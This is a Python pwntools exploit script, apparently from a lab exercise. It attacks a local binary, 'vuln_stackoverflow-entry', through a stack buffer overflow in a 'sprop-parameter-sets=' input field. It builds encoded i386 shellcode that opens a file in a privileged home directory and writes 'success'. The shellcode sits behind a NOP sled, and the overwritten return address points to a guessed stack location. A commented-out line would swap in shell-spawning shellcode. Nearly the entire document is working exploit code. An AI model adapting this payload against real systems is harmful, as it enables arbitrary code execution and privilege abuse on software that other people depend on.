#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
#


import pwn
from pwn import *

exe = context.binary = ELF('vuln_stackoverflow-entry')
context.word_size = 32
context.arch = 'i386'

p = process(executable=exe.path, env={})

successFile = "/home/privileged/stackoverflow-entry"

#shellcode = shellcraft.echo('success')
shellcode = shellcraft.pushstr(successFile)
shellcode += shellcraft.syscall('SYS_open', 'esp', 'O_CREAT | O_WRONLY', 777)
shellcode += shellcraft.echo('success', 'eax')
shellcode += shellcraft.exit(69)
#shellcode = shellcraft.sh()

soff = 0xffffda30
poff = len(exe.path) + 1
print(exe.path)
print(poff)
sps = int((soff - poff)/8) * 8  #address of buffer sps
print(hex(sps))
off = 60 #hit sled if guess slightly wrong
tgt = (sps + off) | 0x4 # avoid 0 etc
print(hex(tgt))
spslen = ppslen = 200
restlen = 20
bufferspace = spslen + ppslen # + restlen retaddr after

#there are quite a few characters that will stop scanf
assembly = encoders.encode(asm(shellcode),avoid='\xfe\x0a\x00,; \f\n\r\t\v')


print(hexdump(assembly))

padding = bufferspace - len(assembly)
print(len(assembly), padding)
bufferfill = asm(shellcraft.nop())*padding
bufferfill += assembly
print(len(bufferfill))
bufferfill = bufferfill[0:spslen] + ',' + bufferfill[spslen:]  # , not written to buffer
print('bufferfill', len(bufferfill))
payload = "sprop-parameter-sets=" + bufferfill + p32(tgt) * 6
print('payload' , len(payload))

print(hexdump(payload))
p.send(payload)
p.sendline()

#p.interactive()
data = p.recvall()
print (data)
